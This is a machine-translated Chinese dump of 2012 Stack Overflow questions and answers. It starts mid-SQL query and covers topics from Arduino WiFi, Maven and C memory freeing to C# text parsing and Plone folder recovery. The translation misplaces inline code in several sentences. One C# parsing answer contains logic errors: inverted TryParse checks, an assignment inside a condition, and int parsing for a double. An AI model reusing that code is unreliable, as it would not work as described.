                          Person.utbContact c ON ac.ContactID = c.ContactID JOIN
                          Person.utbZipCodes z ON z.ZipCodeID = a.ZipCodeID JOIN
                          Person.utbCitys city ON city.CityID = z.CityID JOIN
                          Person.utbContactUtbPhones cp ON c.ContactID = cp.ContactID JOIN
                          Person.utbPhones p ON p.PhoneID = cp.PhonesID JOIN
                          NonPros.utbNonProsUtbAddresses ea ON a.AddressID = ea.AddressID JOIN
                          aspnet_Membership m JOIN
                          NonPros.NonPros e ON m.UserId = e.UserID ON ea.NonProID = e.NonProID JOIN
                          BuildingPros.utbProfessionalsUtbNonPros pe ON e.NonProID = pe.NonProID JOIN
                          dbo.aspnet_Users u ON u.UserId = m.UserId
                WHERE
                CASE @Where
                        WHEN 'Email'    THEN m.Email
                        WHEN 'Name'     THEN c.LastName             
                        WHEN 'Zip'      THEN z.ZIPCode
                        WHEN 'ST'       THEN z.StateCD
                        WHEN 'Title'    THEN c.Title
                        WHEN 'TimeZone' THEN z.TimeZone
                        WHEN 'City'     THEN city.City
                END = @Equals 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-07T04:33:43.697

我怀疑它适用于长度小于 26 个字符的电子邮件，而长度为 26 个字符或更多字符的电子邮件会失败。`VARCHAR(25)`电子邮件地址是不够的。

# ios - 使用 MonoTouch 部署到 App Store

> ID：13756804
> 
> 赞同：4
> 
> 时间：2012-12-07T04:11:11.967
> 
> 标签：ios, xamarin.ios, app-store, monodevelop

我已阅读文档以允许使用 MonoTouch 将 iOS 应用程序部署到 AppStore。这是一个解释相同的链接：http: [//docs.xamarin.com/ios/Guides/Deployment%2C_Testing%2C_and_Metrics/App_Distribution_Overview/Publishing_to_the_App_Store](http://docs.xamarin.com/ios/Guides/Deployment%2C_Testing%2C_and_Metrics/App_Distribution_Overview/Publishing_to_the_App_Store)

如前所述，我已经能够使用“构建存档”选项创建 MonoTouch 存档。但是，当我转到 XCode Organizer 时，我没有在其中看到我的存档。是否有特定原因导致存档中没有按记录显示？

有没有开发人员找到任何替代的部署方式？我还看到了一个名为 Zip App Bundle 的选项。但是，我不知道它是否已经被使用了。

对此问题的任何指导将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:20:47.890

直到最近才知道这一点，但 MonoDevelop 输出的存档格式仅与 Xcode 4.5 兼容（也许 4.4 也是如此，不确定 - 但我知道它不适用于 Xcode 4.2）

# php - codeigniter - 我的程序中的错误

> ID：13756808
> 
> 赞同：0
> 
> 时间：2012-12-07T04:11:19.870
> 
> 标签：php, codeigniter

我正在关注这个网址上的教程：http: [//www.codefactorycr.com/login-with-codeigniter-php.html](http://www.codefactorycr.com/login-with-codeigniter-php.html)

我正在尝试对教程进行一些修改：带有 3 个输入框（公司名称、用户名、密码）的登录表单 下面我遇到了 verifylogin.php 的问题，非常感谢任何指导，谢谢。

```
<?php   if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class VerifyLogin extends CI_Controller
{
public function __construct()
{   parent::__construct();
}

public function index()
{
    $config_login = array(
            array(
             'field'   => 'company',
             'label'   => 'Company',
             'rules'   => 'trim|required|min_length[1]|max_length[50]|strip_tags|encode_php_tags|htmlspecialchars|xss_clean'
            ),
            array(
             'field'   => 'username',
             'label'   => 'Username',
             'rules'   => 'trim|required|min_length[1]|max_length[50]|strip_tags|encode_php_tags|htmlspecialchars|xss_clean'
            ),
            array(
             'field'   => 'password',
             'label'   => 'Password',
             'rules'   => 'required|xss_clean|callback__check_database'
            )
    );

    $this -> form_validation -> set_rules($config_login); 
```

是的。在我将 $config 更改为 $config_login 后问题解决了。非常感谢您的指导。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T05:21:46.303

将所有 where 条件更改为这样，

```
$this->db->where('company',$company);
$this->db->where('username',$username);
$this->db->where('password',$password); 
```

当您将这些变量传递给您的模型函数登录时。并将您的登录名更改为

```
function login($company, $username, $password){ 
```

希望这可以帮助

问候

iijb

# mysql - mysql 返回正确的结果字段长度但内容被截断

> ID：13756812
> 
> 赞同：0
> 
> 时间：2012-12-07T04:11:57.857
> 
> 标签：mysql, delphi, odbc, ado

我正在使用 delphi/ado/odbc 连接到 mysql 服务器。执行以下语句后：

```
SHOW CREATE VIEW aViewName 
```

结果集中的“创建视图”字段包含一个很长的字符串（> 4096 个字符）。虽然内容的长度是正确的，但我得到了 4096 个字节，并附加了一些垃圾字符。

这是 mysql odbc 驱动程序中的错误还是 ADO 的限制？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-08T02:14:42.353

我找到了解决方法。我没有使用“SHOW CREAT VIEW ...”，而是使用 information_schema 通过执行以下语句来检索视图创建 sql：

```
SELECT * FROM information_schema.VIEWS where TABLE_NAME="aViewName" 
```

看起来如果选择结果没有相应的表结构（例如“SHOW CREATE ...”或“SELECT 'something more than 4096 chars'”），那么 ADO 或 ODBC 驱动程序将使用 varchar(4096) 假定字符串内容。

感谢您的意见。

# arduino - Arduino WiFi shield 在 WiFi.status() 处停止工作

> ID：13756818
> 
> 赞同：4
> 
> 时间：2012-12-07T04:13:09.480
> 
> 标签：arduino

更新：我查明了问题出在哪里。为避免任何复杂性，我使用的是 ScanNetwork 示例，因此我什至不必输入`SSID`. 代码一命中就停止在板上运行`WiFi.status()`。我有一个`Serial.println`之前和之后它试图得到一个`WiFi.status()`，`serial.println`之后没有执行，当然，我仍然没有连接。

我已经下载了新的代码副本，但情况还是一样。真是想不通了。。。。

* * *

我正在使用官方的 arduino wifi shield，我有以下代码：

```
status = WiFi.begin([ssid],[pass]);
Serial.println(status); 
```

状态既不是`WL_CONNECTED`也不是，这是官方参考[http://arduino.cc/en/Reference/WiFiBegin](http://arduino.cc/en/Reference/WiFiBegin)`WL_IDLE_STATUS`中列出的两种可能的响应

状态是数字 4。当然，我无法连接到 wifi。这是什么？？？？

我已经按了一百万次重置按钮，还有更强大的恢复出厂按钮吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-16T02:15:28.633

![在此处输入图像描述](../Images/d8518c634a5ab8be003ffe78ae503eec.png)

我已经想通了。显然，有一个跳线，当你把它放进去时，它会把屏蔽踢到 DFU 模式，可以重新编程。结果，护盾就不会出现。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T05:34:30.277

根据[WiFi.h](https://github.com/arduino/Arduino/blob/master/libraries/WiFi/WiFi.h)函数的返回值`begin()`（所有三个，每个安全方案一个）是`int`s。这个函数没有直接说明，但我相信就像`status()`函数一样，返回类型是 a `wl_status_t`。`wl_status_t`是[wl_definitions.h](https://github.com/arduino/Arduino/blob/master/libraries/WiFi/utility/wl_definitions.h)中声明的枚举，如：

```
typedef enum {
        WL_NO_SHIELD = 255,
        WL_IDLE_STATUS = 0,
        WL_NO_SSID_AVAIL,
        WL_SCAN_COMPLETED,
        WL_CONNECTED,
        WL_CONNECT_FAILED,
        WL_CONNECTION_LOST,
        WL_DISCONNECTED
} wl_status_t; 
```

所以你`4`是`WL_CONNECT_FAILED`。您可能并不感到惊讶，因为您知道，您的连接失败了。

最喜欢的调试器，AKA 重置按钮，只能做这么多。打印状态是一个好的开始。确保您使用的是`begin()`适合您的安全类型的正确风格，您似乎正在使用一种用于 WPA 的风格。考虑完全关闭路由器的安全性（如果在您所在地区这样做是安全的），或者使用备用路由器来测试屏蔽的通信能力。此外，这听起来很明显，但请检查 SSID 的拼写错误。

# android - Maven：对不在中央的第三方 jar 的依赖

> ID：13756822
> 
> 赞同：0
> 
> 时间：2012-12-07T04:13:16.800
> 
> 标签：android, maven, jar

我正在 mavenizing [RoboBillingLibrary](https://github.com/christopherperry/RoboBillingLibrary)并且我依赖于不在[Maven Central 中的](http://search.maven.org/)[亚马逊应用内购买库](https://developer.amazon.com/sdk/in-app-purchasing.html)。添加依赖项的正确方法是什么（我自己不将其提交给中心）？

我[已经在本地安装了它](http://maven.apache.org/guides/mini/guide-3rd-party-jars-local.html)，这对我来说很好，但对于任何想要使用我的库的人来说都不是很好。另外，我想将 RoboBillingLibrary 部署到中央，而这种依赖性使我无法这样做。我试过了

```
mvn clean install 
```

从父目录中查看我是否可以安装它并抱怨：

> 找不到工件 com.amazon:in-app-purchasing:jar:1.0.3 in
> 
> 中央

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:25:20.043

`mvn install:install-file -Dfile=in-app-purchasing-1.0.3.jar -DgeneratePom=true -Dpackaging=jar -Dversion=1.0.3 -DgroupId=in-app-purchasing -DartifactId=in-app-purchasing`

根据或使用 pom 文件更改值 -DpomFile=pom.xml

# c# - Mono Zeroconf 需要样品

> ID：13756825
> 
> 赞同：3
> 
> 时间：2012-12-07T04:13:26.663
> 
> 标签：c#, mono, bonjour, zeroconf

我正在尝试制作一个简单的概念演示应用程序，我将来可能会使用它的代码。具体来说，我想让 iPhone 运行一个将 XML 数据发送到 Bonjour 服务的应用程序。我已经有一个在 mac 上运行并执行此操作的 Objective-C 应用程序，但我需要在 Windows 上制作一个对 Mono Zeroconf 有强烈偏好的应用程序，因为该项目稍后可能涉及使用 Mono 框架。

为此，我需要一个使用 Mono Zeroconf 库的工作示例。我可以在网站上找到的示例还不够。他们允许我做的只是注册一项服务，但在那之后什么也没有。具体来说，我有这个：

```
RegisterService service = new RegisterService();
service.Name = "AirControlServer";
service.RegType = "_http.tcp.";
service.ReplyDomain = "local.";
service.Port = 3689;
service.Register(); 
```

现在我完全不知道该怎么做。如果有人可以将我链接到一些示例代码或其他东西，那就太好了。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T16:32:13.030

Zeroconf 仅用于宣布或发现。也就是说，如果你有某种服务（例如，http 服务器），你可以使用 Mono.Zeroconf 来宣布它。提供的服务超出了图书馆的范围，您必须*照常*提供。换句话说，您可以使用该库来回答诸如“我的服务提供商的 IP 地址是什么？”之类的问题。或宣布此类服务（“告诉他们`X.X.X.X`在端口上有服务`YY`）。

公告部分，你已经找到例子了，你也可以看看[这个](https://stackoverflow.com/questions/599846/how-to-register-a-service-with-mono-zeroconf)问题。对于发现，请看[这里](http://mono-project.com/Mono.Zeroconf)（在“侦听和解析服务”部分）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-07-20T04:04:19.187

在[`Mono.Zeroconf`源代码](https://github.com/mono/Mono.Zeroconf)中，有一个子目录，其中包含用于发布和浏览的`MZClient`良好示例代码。[`ZeroconfClient.cs`](https://github.com/mono/Mono.Zeroconf/blob/master/src/MZClient/ZeroconfClient.cs)

# java - “找不到符号”错误

> ID：13756826
> 
> 赞同：0
> 
> 时间：2012-12-07T04:13:29.337
> 
> 标签：java, compiler-errors

我已经写了我的接口代码，但是错误。如何比较两个家具对象的两个价格？我在 if 语句中做对了吗？`return`声明说找不到符号。我怎样才能解决这个问题？

```
public boolean IsCheaper(Furniture f)
{
    if (f instanceof Furniture)
    {
         boolean status;
         if (price > f.getPrice())
             status = true;
         else if (price < f.getPrice())
             status = false;

    }
    return status;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:15:33.780

```
 public boolean IsCheaper(Furniture f)
    {
      boolean status= false; // or  true
      if (f instanceof Furniture) // if(f!=null) as suggested by a comment
       {

        if (price > f.getPrice())
            status = true;
        else if (price < f.getPrice())
            status = false;

       }
       return status;
     } 
```

status 应该在 if 块之外声明，因为您需要它在外面。

是否真的需要 if 检查，仅当方法接受家具的父类时才需要检查 instanceof

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:19:49.517

变量的范围`boolean status;`只是 if 块`if (f instanceof Furniture)`

并且您在 if 块之外有一个 return 语句，因此一旦 if 块完成，变量`status`就会因为超出范围而变得不可用。

因此编译器无法找到它，因此说*“找不到符号：状态”*。

`if (f instanceof Furniture)`所以在块外声明你的状态变量。

# jpeg - JPEG文件中的DHT

> ID：13756829
> 
> 赞同：1
> 
> 时间：2012-12-07T04:14:41.320
> 
> 标签：jpeg

我正在处理 jpeg 段，我遇到了 DHT，我无法理解下面显示的一些十六进制值之间的关系，这些值从 0002 开始到 607 结束。

FFC4 霍夫曼表 001B（长度） 0（用于 DC 编号的霍夫曼表） 1（用于颜色分量的目标标识符）

00020301010100000000000000000000（长度从 1 位到 16 位的霍夫曼码字的数量存储在接下来的 16 个字节中） 0304010205000607

谢谢，Y.Anish

# c - free() 是在所有深度还是仅在最高级别释放内存？

> ID：13756831
> 
> 赞同：0
> 
> 时间：2012-12-07T04:15:12.270
> 
> 标签：c, memory-management, memory-leaks, free

假设我有一个这样定义的结构：

```
struct myStruct{
    data* anotherStruct;
} 
```

假设我在堆上为 type 的结构分配内存`myStruct`。指向此结构的指针称为`ptr`。然后我打电话`free(ptr)`。这会释放仅为 myStruct 分配的内存，还是释放为`myStruct`and分配的内存`anotherStruct`？

如果它只释放分配给 的内存`myStruct`，这是否会导致内存泄漏，因为没有指向`anotherStruct`并且永远无法释放的指针？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:16:53.827

它只释放分配给该地址的内存。即：是的，最高级别。

> **这会释放仅为 myStruct 分配的内存，还是释放为`myStruct`and分配的内存`anotherStruct`？**

它只释放分配给`myStruct`.

> **如果它只释放分配给 的内存`myStruct`，这是否会导致内存泄漏，因为没有指向`anotherStruct`并且永远无法释放的指针？**

如果您没有指向`anotherStruct`那么是的指针，它会泄漏内存。通常的策略是按照分配顺序的相反顺序释放内存。

例如：在您的情况下，您首先分配`myStruct`然后`anotherStruct`，因此您应该以完全相反的顺序解除分配，即：`anotherStruct`首先释放然后 `myStruct`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T04:16:37.767

只有最高级别。它不是那么聪明。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T04:25:02.790

在代码中

```
struct myStruct *ptr = malloc(sizeof(myStruct));
.
.
.
free(ptr); 
```

没有任何显示影响 ,的`anotherStruct`成员。您可能希望使用指向有用的内存块。然后，您必须在调用*之前*调用以避免任何内存泄漏。`*ptr``ptr->anotherStruct``malloc``ptr->anotherStruct``free(ptr->anotherStruct)` *`free(ptr)`*

 *为了自动处理这种“内部（解除）分配”，定义初始化和销毁​​函数非常有用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T04:18:11.410

地址是释放内存的关键。每个`malloc()`返回的内存都是一个单独的键。所以上块（即为 myStruct 类型分配的内存）仅被释放并导致内存泄漏。

最佳做法是释放那些内部块，然后释放上面的块。否则，如果未存储在任何地方，您将丢失指针地址。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-07T04:19:22.080

“free”只能释放最高级别分配的内存。简单的原因是，对于结构内的指针成员，您可能会也可能不会从堆中分配内存。free 如何能够跟踪所有指针成员的内存来自哪里？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-07T04:20:46.330

它只释放分配给该地址的内存，如果你想释放整个链表，那么你必须循环遍历它并每次释放一个元素（在你的情况下是一个结构），你必须保存地址到下一个结构释放实际指针，然后移动到下一个并继续执行，直到到达指向 null 的指针。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-07T06:12:37.347

是的，正如大家所说，它将释放仅为结构分配的内存，而不是 anotherStruct 指向的内存。它肯定会导致内存泄漏。释放动态分配的内存是程序员的责任。

您可以使用工具“valgrind”来检查内存泄漏。*

# identifier - 应有标识符

> ID：13756838
> 
> 赞同：0
> 
> 时间：2012-12-07T04:16:48.133
> 
> 标签：identifier, bluej

我在这一行不断收到错误消息“预期的标识符”：hk.guess(charToGuess); 我需要做什么来纠正它？

我正在创建一个简单的 Hangman 游戏，这给我带来了很多麻烦。我对编程很陌生，我开始对这个项目感到非常不知所措。

```
 import java.util.Random;
    import java.util.Scanner;
    import java.util.*; 
    import java.io.BufferedReader;
    import java.io.IOException;
    import java.io.InputStreamReader;

    public class Hangman {
    public static void main( String[] args ) {
    HangmanSession hangmanSession = new HangmanSession();
    hangmanSession.play();
    }

    private HiddenKeyword hiddenKeyword;
    private int triesNumber = 7;
    hiddenKeyword hk = new HiddenKeyword();
    hk.guess(charToGuess);
    private void printState() {
    System.out.print( "Hidden word : " );
    hiddenKeyword.print();
    System.out.print( "Tries left: " + triesNumber + "\n<guess letter:>" );
    }

    public void play() {
    boolean bool = true;
    while( true ) {
    bool = true;
    printState();
    System.out.println( "Try again, you've already used that letter " + char.class );
    bool = false;
    }
    if( bool ) {
    if( hiddenKeyword.guess( char.class ) ) {
    System.out.println( "YAY! you have found letter! " + ch );
    }
    else {
    triesNumber--;
    }
    if( triesNumber < 1 )
    gameOver();

    if( hiddenKeyword.found() )
    congratulations();
    }
    }        //end of bool
    public void congratulations() {
    System.out.println( "Congratulations " + player + ", you win!" );
    System.exit( 0 );
    }

    public void gameOver() {
    System.out.println( "Sorry " + player + ", you lost, but you can try again!" );
    System.exit( 0 );
    }
    private String fValue;
    private StringBuffer pValue;
    private int lfoundNumber = 0;
    public String words() {
    Random r = new Random();
    int random = r.nextInt(20)+1;
    }

    public boolean found() {
    System.out.println( "Letters found:" + lfoundNumber + "/" + fValue.length() );
    return ( lfoundNumber == fValue.length() );
    }

    public boolean guess( char c ) {
    int index = fValue.indexOf( c );
    if( index == -1 )
    return false;
    else {
    lfoundNumber = lfoundNumber + findOccurances( c );
    return true;
    }
    }

    private int findOccurances( char c ) {
    int idx = fValue.indexOf( c );
    pValue.setCharAt( idx, fValue.charAt( idx ) );
    int counter = 1;
    while( idx != -1 ) {
    int idxx = fValue.indexOf( c, idx + 1 );
    idx = idxx;
    if( idx != -1 ) {
    counter++;
    pValue.setCharAt( idx, fValue.charAt( idx ) );
    }
    }
    return counter;
    }

    public void print() {
    System.out.println( pValue );
    }
    private char[] lbox = new char[24];
    private int counter = 0;

    public boolean contains( char c ) {
    for( int i = 0; i < counter; i++ ) {
    if( lbox[i] == c )
    return true;
    }
    lbox[counter] = c;
    counter++;
    return false;
    }

    public void print() {
    System.out.print( "\nLetterBox:" );
    for( int i = 0; i < counter; i++ ) {
    System.out.print( lbox[i] );
    }
    System.out.println( "" );
    }

    public static void main(String[] args) {
    int words = 20;String wordsString;
    switch(random) {
    case 1:
    return "star";

    case 2:
    return "hooray";

    case 3:
    return "dog";

    case 4:
    return "improvise";

    case 5: 
    return "teacher";

    case 6:
    return "college";

    case 7:
    return "seahawks";

    case 8:
    return "read";

    case 9:
    return "computer";

   case 10:
   return "program";

   case 11:
   return "holiday";

   case 12:
   return "film";

   case 13:
   return "music";

   case 14:
   return "learn";

   case 15: 
   return "library";

   case 16:
   return "waterfall";

   case 17:
   return "book";

   case 18:
   return "semester";

   case 19:
   return "first";

   case 20:
   return "vacation";

   default:
   return"";
   }

   }

   } 
   } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T12:19:50.077

请记住，作为 Java 的经验法则，一个类可能只包含字段和方法。语句（除了那些将字段初始化为默认值的语句）只能写在方法中。

考虑到上述情况，问题在于您只是`hk.guess(charToGuess)`在类内部而不是在任何方法内部调用方法（），并且该语句不是字段初始值设定项。

# php - Facebook API：如何获取用户屏蔽列表

> ID：13756841
> 
> 赞同：2
> 
> 时间：2012-12-07T04:17:01.567
> 
> 标签：php, facebook, facebook-graph-api, facebook-fql

我在 Facebook 上构建了一个应用程序。

*   阻止某人：

    *   单击任何 Facebook 页面右上角的帐户菜单，然后选择**隐私设置**。
    *   滚动到被**阻止的人员和应用程序**部分，然后单击**管理阻止**。
    *   输入您要阻止的人的姓名或电子邮件地址，然后单击**阻止**。当您阻止他们时，他们不会**收到通知。**
*   我的问题是：

    *   如何使用我的应用程序上的 Facebook API 检查两个 Facebook 用户之间的阻止状态？或任何从当前用户获取阻止列表的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T06:31:24.623

**page_blocked_user**

一个 FQL 表，可用于返回被 Facebook 页面阻止的用户列表。

Page Graph API 对象具有等效的阻塞连接，也可用于阻止或取消阻止用户。

[https://developers.facebook.com/docs/reference/fql/page_blocked_user/](https://developers.facebook.com/docs/reference/fql/page_blocked_user/)

# c# - 尝试从 C# 中的文本文件创建对象时出现 IndexOutOfRangeException

> ID：13756842
> 
> 赞同：0
> 
> 时间：2012-12-07T04:17:05.513
> 
> 标签：c#, list, object, text

我目前正在尝试使用“|” 分隔文本文件并从其中包含的数据创建对象。例子：

```
Name|Address|City|State|Zip|Birthday|ID|Etc.
Name2|Address2|City2|State2|Zip2|Birthday2|ID2|Etc. 
```

然后将新创建的对象添加到所述对象的列表中，程序通过使用 .Peek() 的 while 循环移动到文件的下一行（以确保我不会超过文件）。

但是，当它开始创建第二个对象（更具体地说，第二个对象的第二个字段）时，它会抛出一个 Index Out Of Range 异常，我终生无法弄清楚为什么。感谢任何可能阅读此内容的人！

```
 StreamReader textIn = new StreamReader(new FileStream(path, FileMode.OpenOrCreate, FileAccess.Read));

        List<Student> students = new List<Student>();

        while (textIn.Peek() != -1)
        {
            string row = textIn.ReadLine();
            MessageBox.Show(row);
            string [] fields = row.Split('|');
            Student temp = new Student();

            try
            {
                temp.name = fields[0];
                temp.address = fields[1];
                temp.city = fields[2];
                temp.state = fields[3];
                temp.zipCode = Convert.ToInt32(fields[4]);
                temp.birthdate = fields[5];
                temp.studentID = Convert.ToInt32(fields[6]);
                temp.sGPA = Convert.ToDouble(fields[7]);
            }
            catch
            {
                MessageBox.Show("IndexOutOfRangeException caught");
            }

            students.Add(temp);
        }

        textIn.Close(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:21:12.920

首先，您无法确定当前 catch 块是否为 IndexOutOfRange 异常。

```
catch
{
    MessageBox.Show("IndexOutOfRangeException caught");
} 
```

它可以是任何东西，在解析为加倍时可能是例外。您可以将 catch 块修改为：

```
catch(IndexOutOfRangeException ex)
{
    MessageBox.Show(ex.Message);
} 
```

此外，如果您要访问，`fields[7]`那么最好检查数组的长度以确保您的数组中至少有 8 个元素。

```
 if(fileds.Length >=8)
       {
        temp.name = fields[0];
        .... 
```

要捕获`FormatException`在双重解析期间可能发生的情况，您可以添加一个额外的 catch 块：

```
catch (FormatException ex)
{
    MessageBox.Show(ex.Message);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:21:28.613

在给定的数据中，如果每行至少有八列，则不会获得范围异常的索引，但`parsing of item at 4, 6, 7 would fail`由于它们是`not`数字，因此将非数字值转换为 int 和 double 会引发异常。

```
temp.zipCode = Convert.ToInt32(fields[4]); 
temp.studentID = Convert.ToInt32(fields[6]);
temp.sGPA = Convert.ToDouble(fields[7]); 
```

您需要更改 catch 块才能知道异常的原因

```
}
catch(Exception ex)
{
    MessageBox.Show(ex.Message);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T04:23:29.827

1.  检查你是否在一行中有所有 8 个字段。
2.  如果不是，则显示一条消息。
3.  获取实际异常并显示其消息以查看真正的问题描述。
4.  使用[Double.TryParse 方法](http://msdn.microsoft.com/en-us/library/system.double.tryparse.aspx)和[Int32.TryParse 方法](http://msdn.microsoft.com/en-us/library/f02979c7.aspx)确保所有数值都有效
5.  也可以`while (!textIn.EndOfStream)`改用。

* * *

```
 try
 {
    int tempInt;
    double tempDouble;
    if (fields.Length = 8)//#1
    {
        temp.name = fields[0];
        temp.address = fields[1];
        temp.city = fields[2];
        temp.state = fields[3];
        if (!int.TryParse(fields[4], out tempInt))    //#4
            temp.zipCode = tempInt;
        else
        {
           //..invalid value in field
        }
        temp.birthdate = fields[5];
        if (!int.TryParse(fields[6], out tempInt))    //#4
            temp.studentID = tempInt;
        else
        {
           //..invalid value in field
        }
        if (!int.TryParse(fields[7], out tempDouble)) //#4
            temp.sGPA = tempDouble;
        else
        {
           //..invalid value in field
        }
    }
    else //#2
    {
        MessageBox.Show("Invalid number of fields");
    }
}
catch (Exception ex)   //#3
{
    MessageBox.Show(ex.Message);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T04:29:46.897

如果数据在每一行上，也许`ReadAllLines`会更好一些：

```
 List<Student> students = new List<Student>();
            using (FileStream textIn = new FileStream(path, FileMode.Open, FileAccess.Read))
            {
                foreach (string line in File.ReadAllLines(path))
                {
                    MessageBox.Show(line);
                    string[] fields = line.Split('|');
                    Student temp = new Student();
                    try
                    {
                        temp.name = fields[0];
                        temp.address = fields[1];
                        temp.city = fields[2];
                        temp.state = fields[3];
                        temp.zipCode = Convert.ToInt32(fields[4]);
                        temp.birthdate = fields[5];
                        temp.studentID = Convert.ToInt32(fields[6]);
                        temp.sGPA = Convert.ToDouble(fields[7]);
                    }
                    catch
                    {
                        MessageBox.Show(string.Format("IndexOutOfRangeException caught, Split Result:", string.Join(", ", fields.ToArray())));
                    }
                    students.Add(temp);
                }
            } 
```

# plone - 是否可以在 plone 4.1 中恢复已删除的文件夹？

> ID：13756845
> 
> 赞同：2
> 
> 时间：2012-12-07T04:17:14.763
> 
> 标签：plone, recovery

如何在 plone 4.1 中恢复已删除的文件夹？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-07T11:01:23.047

如果您还没有打包删除该文件夹的事务，您可以恢复该文件夹。

首先，使用[ZMI 中父文件夹上的“撤消”选项卡](https://plone.org/documentation/kb/using-the-zope-undo-system-to-roll-back)。它可能不起作用，系统上的太多其他东西已经改变（通常是目录），所有的改变都被有效地回滚。

下一步有点繁琐和复杂。然后您需要做的是使用包装器打开对象数据库 (ZODB)，该包装器将向您显示数据库在历史上给定点的状态。这样做需要手动编辑您的 Zope 服务器配置。我已经[在博客文章中写了这些步骤，](http://www.zopatista.com/plone/2008/12/18/saving-the-day-recovering-lost-objects/)但这些步骤有点过时了。

在现代的 Plone buildout 中，您需要将`zc.beforestorage`egg 添加到您的 buildout 中，并且您需要将`enable-product-installation`Zope 的设置切换为`False`; 使用 beforestorage 包装器会使您的数据库成为只读的，并且产品安装代码将尝试提交到数据库，从而导致无法启动：

```
[instance]
eggs +=
    zc.beforestorage
zope-conf-additional +=
    enable-product-installation False 
```

重建构建后，您需要打开`zope.conf`与您的实例关联的文件。如果您通常使用 启动服务器`bin/instance`，则该文件位于`parts/instance/etc/zope.conf`; 使用的脚本`bin/`与部件名称匹配（`instance`在本例中）。

找到它定义 ZODB 主数据库的部分：

```
<zodb_db main>
    # Main database
    cache-size 10000

    # Blob-enabled FileStorage database
    <blobstorage>
      blob-dir /path/to/var/blobstorage
      <filestorage>
        path /path/to/var/filestorage/Data.fs
      </filestorage>
    </blobstorage>
    mount-point /
</zodb_db> 
```

您需要将`beforestorage`包装器添加到该声明中：

```
<zodb_db main>
    # Main database
    cache-size 10000

    %import zc.beforestorage
    <before>
    before 2012-12-01T12:00:00

    # Blob-enabled FileStorage database
    <blobstorage>
      blob-dir /path/to/var/blobstorage
      <filestorage>
        path /path/to/var/filestorage/Data.fs
      </filestorage>
    </blobstorage>

    </before>

    mount-point /
</zodb_db> 
```

注意`before <iso timestamp>`那里的行；当您启动您的实例时，该站点将按该时间戳显示。选择一个接近于您删除文件夹的时间。现在您可以将它（再次使用 ZMI）导出到`.zexp`文件中。撤消对文件的更改`zope.conf`，重新启动并导入恢复的文件夹。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-07T04:31:28.163

是的，可以在相关文件夹上使用 Zope 管理界面的“撤消”选项卡。这将回滚您删除文件夹的数据库事务，并且如果您*刚刚*删除了该文件夹，则工作效率最高。其他信息位于：[https ://plone.org/documentation/kb/using-the-zope-undo-system-to-roll-back](https://plone.org/documentation/kb/using-the-zope-undo-system-to-roll-back)

# css - CSS3 过渡的问题

> ID：13756846
> 
> 赞同：0
> 
> 时间：2012-12-07T04:17:16.530
> 
> 标签：css, css-transitions

我不太确定如何使用 CSS3 过渡来做我想做的事。我是新手，所以我真的可以使用一些帮助:)

这是我正在研究的[JSFiddle 。](http://jsfiddle.net/Zrp8p/3/)

所以，基本上`div.portlet`应该是一个窗口，显示爆炸中的内容。当您单击 时`portlet`，我希望它增长以填满`div.containe`r。当你关闭时，我希望它缩小到正常大小。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:34:05.567

褪色不是交易属性，您需要像`fadeIn`下面定义的那样定义您可以通过以下方式执行此操作

正如你的评论

尝试

```
div.portlet
{
transition: ease-out 2s;
-moz-transition: ease-out 2s; /* Firefox 4 */
-webkit-transition: ease-out 2s; /* Safari and Chrome */
-o-transition: ease-out 2s; /* Opera */
} 
```

并添加 z-index:3; to `div.portlet`and z-index:4 to class`open`

和jQuery

```
$(".container").on("click", ".portlet", function(){
    $(".portlet").css("z-index","3");   
    $(this).addClass("open");    
    $(this).css("z-index","333");    
}); 

}); 
```

# c# - .cs 文件中大型硬编码数组的性能注意事项

> ID：13756852
> 
> 赞同：0
> 
> 时间：2012-12-07T04:18:01.653
> 
> 标签：c#, .net, arrays, performance, optimization

我正在编写一些性能很重要的代码。在其中的一部分中，我必须将一大组预先计算的数据与动态值进行比较。目前，我将预先计算的数据存储在 .cs 文件中的一个巨大数组中：

```
Data[] data = { /* my data  set */ }; 
```

数据集大约 90kb，或大约 13k 个元素。我想知道这样做是否有任何缺点，而不是从外部文件加载它？我不完全确定 C# 在内部是如何工作的，所以我只是想了解使用此方法可能遇到的任何性能问题。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-07T04:27:07.447

好吧，说实话，90kb 并没有那么大。对于这种大小的数组，无论哪种方式，您都不会看到任何明显的差异。

一般来说，如果你有一个巨大的数组，我不建议将它存储在源文件中。运行时性能可能不是问题，但我可以看到它会减慢编译速度。

